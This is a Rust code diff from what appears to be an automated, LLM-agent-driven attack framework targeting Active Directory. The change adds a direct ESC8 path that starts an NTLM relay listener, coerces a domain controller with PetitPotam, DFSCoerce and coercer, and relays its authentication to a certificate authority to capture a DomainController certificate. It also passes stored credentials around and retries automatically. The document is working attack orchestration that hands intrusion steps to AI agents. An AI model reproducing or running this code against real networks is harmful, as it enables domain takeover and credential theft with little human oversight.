@@ -17,10 +17,14 @@
 use std::sync::Arc;
 use std::time::Duration;
 
+use ares_llm::ToolCall;
 use serde_json::json;
 use tokio::sync::watch;
 use tracing::{debug, info, warn};
 
+use super::adcs_exploitation::{
+    build_relay_coerce_args, parse_relay_coerce_output, RelayCoerceInputs,
+};
 use crate::orchestrator::dispatcher::Dispatcher;
 use crate::orchestrator::state::*;
 
@@ -59,6 +63,28 @@ pub async fn auto_ntlm_relay(dispatcher: Arc<Dispatcher>, mut shutdown: watch::R
         };
 
         for item in work {
+            let priority = dispatcher.effective_priority("ntlm_relay");
+
+            // ESC8 short-circuit: dispatch `relay_and_coerce` directly via
+            // the tool dispatcher, bypassing the coercion LLM agent. The
+            // composite tool spawns its own ntlmrelayx listener, acquires
+            // the host-wide port-445 lock, then fires PetitPotam → DFSCoerce
+            // → coercer in sequence — no race against a separately-spawned
+            // listener, no `NO_RELAY_LISTENER` bail from the preflight in
+            // `ares-tools::coercion::verify_listener_present`. The LLM-agent
+            // path (kept below for SmbToLdap / SmbToMssql) is what was
+            // producing silent "no captured auth" outcomes by splitting
+            // `ntlmrelayx_to_*` and the coerce across two tool calls and
+            // racing the listener bind.
+            if let RelayType::Esc8 { .. } = &item.relay_type {
+                if dispatch_esc8_direct(&dispatcher, &item).await {
+                    continue;
+                }
+                // Fell through (e.g. missing coercion_source) — drop into
+                // the LLM-agent path so the agent can still attempt
+                // something useful with the partial work item.
+            }
+
             // Optional credential — when `item.credential` is None we drive
             // the coerce primitive unauthenticated (PetitPotam against
             // unpatched DCs needs no source-side credentials, and that's
@@ -115,7 +141,6 @@ pub async fn auto_ntlm_relay(dispatcher: Arc<Dispatcher>, mut shutdown: watch::R
                 }
             };
 
-            let priority = dispatcher.effective_priority("ntlm_relay");
             match dispatcher
                 .throttled_submit("coercion", "coercion", payload, priority)
                 .await
@@ -471,6 +496,140 @@ struct RelayWork {
     /// is the only viable path against a foreign-forest DC for which we
     /// hold no cred.
     credential: Option<ares_core::models::Credential>,
+}
+
+/// Deterministic ESC8 dispatch path. Mirrors
+/// `adcs_exploitation::dispatch_relay_coerce_chain` but takes its inputs
+/// from an `auto_ntlm_relay`-produced `RelayWork` instead of an
+/// `AdcsExploitWork`. Returns `true` when the dispatch was kicked off
+/// (caller should `continue` past the LLM-agent path). Returns `false`
+/// when required inputs are missing — caller falls through to the
+/// throttled LLM-agent submit so the work isn't dropped on the floor.
+///
+/// Marks dedup *before* the spawn so the next 30s tick doesn't double-fire.
+/// On `RELAY_BIND_BUSY` the spawned task clears dedup so the next tick can
+/// retry once the holder releases port 445.
+async fn dispatch_esc8_direct(dispatcher: &Arc<Dispatcher>, item: &RelayWork) -> bool {
+    let Some(coerce_target) = item.coercion_source.clone() else {
+        debug!(
+            relay = %item.relay_target,
+            "auto_ntlm_relay Esc8 direct: no coercion_source — falling back to LLM-agent path"
+        );
+        return false;
+    };
+    if item.listener.is_empty() {
+        debug!(
+            relay = %item.relay_target,
+            "auto_ntlm_relay Esc8 direct: listener_ip not configured — falling back to LLM-agent path"
+        );
+        return false;
+    }
+    if item.relay_target.is_empty() {
+        debug!("auto_ntlm_relay Esc8 direct: empty relay_target — skipping");
+        return false;
+    }
+
+    // Pre-mark dedup so the next tick doesn't re-fire while this is in flight.
+    {
+        let mut state = dispatcher.state.write().await;
+        state.mark_processed(DEDUP_SET, item.dedup_key.clone());
+    }
+    let _ = dispatcher
+        .state
+        .persist_dedup(&dispatcher.queue, DEDUP_SET, &item.dedup_key)
+        .await;
+
+    let dispatcher_bg = dispatcher.clone();
+    let ca_host = item.relay_target.clone();
+    let attacker_ip = item.listener.clone();
+    let credential = item.credential.clone();
+    let dedup_key = item.dedup_key.clone();
+
+    tokio::spawn(async move {
+        let cred_user = credential
+            .as_ref()
+            .map(|c| c.username.clone())
+            .unwrap_or_default();
+        let cred_pass = credential
+            .as_ref()
+            .map(|c| c.password.clone())
+            .unwrap_or_default();
+        let cred_domain = credential
+            .as_ref()
+            .map(|c| c.domain.clone())
+            .unwrap_or_default();
+        let args = build_relay_coerce_args(RelayCoerceInputs {
+            ca_host: &ca_host,
+            coerce_target: &coerce_target,
+            attacker_ip: &attacker_ip,
+            template: "DomainController",
+            cred_username: &cred_user,
+            cred_password: &cred_pass,
+            cred_domain: &cred_domain,
+            relay_target_url: None,
+        });
+        let task_id = format!(
+            "ntlm_relay_esc8_{}",
+            &uuid::Uuid::new_v4().simple().to_string()[..12]
+        );
+        let call = ToolCall {
+            id: format!("relay_and_coerce_{}", uuid::Uuid::new_v4().simple()),
+            name: "relay_and_coerce".to_string(),
+            arguments: args,
+        };
+        info!(
+            task_id = %task_id,
+            ca_host = %ca_host,
+            coerce_target = %coerce_target,
+            attacker_ip = %attacker_ip,
+            "auto_ntlm_relay Esc8: dispatching relay_and_coerce directly (no LLM)"
+        );
+        match dispatcher_bg
+            .llm_runner
+            .tool_dispatcher()
+            .dispatch_tool("coercion", &task_id, &call)
+            .await
+        {
+            Ok(output) => {
+                let parsed = parse_relay_coerce_output(&output.output);
+                if parsed.bind_busy {
+                    info!(
+                        task_id = %task_id,
+                        "auto_ntlm_relay Esc8: RELAY_BIND_BUSY — clearing dedup so next tick can retry"
+                    );
+                    {
+                        let mut state = dispatcher_bg.state.write().await;
+                        state.unmark_processed(DEDUP_SET, &dedup_key);
+                    }
+                    let _ = dispatcher_bg
+                        .state
+                        .unpersist_dedup(&dispatcher_bg.queue, DEDUP_SET, &dedup_key)
+                        .await;
+                } else if let Some(pfx_path) = parsed.pfx_path {
+                    info!(
+                        task_id = %task_id,
+                        pfx_path = %pfx_path,
+                        relayed_user = ?parsed.relayed_user,
+                        "auto_ntlm_relay Esc8: PFX captured — auto_certipy_auth will pick up"
+                    );
+                } else {
+                    debug!(
+                        task_id = %task_id,
+                        "auto_ntlm_relay Esc8: relay completed without PFX (target patched / no auth captured)"
+                    );
+                }
+            }
+            Err(e) => {
+                warn!(
+                    task_id = %task_id,
+                    err = %e,
+                    "auto_ntlm_relay Esc8: dispatch errored"
+                );
+            }
+        }
+    });
+
+    true
 }
 
 enum RelayType {
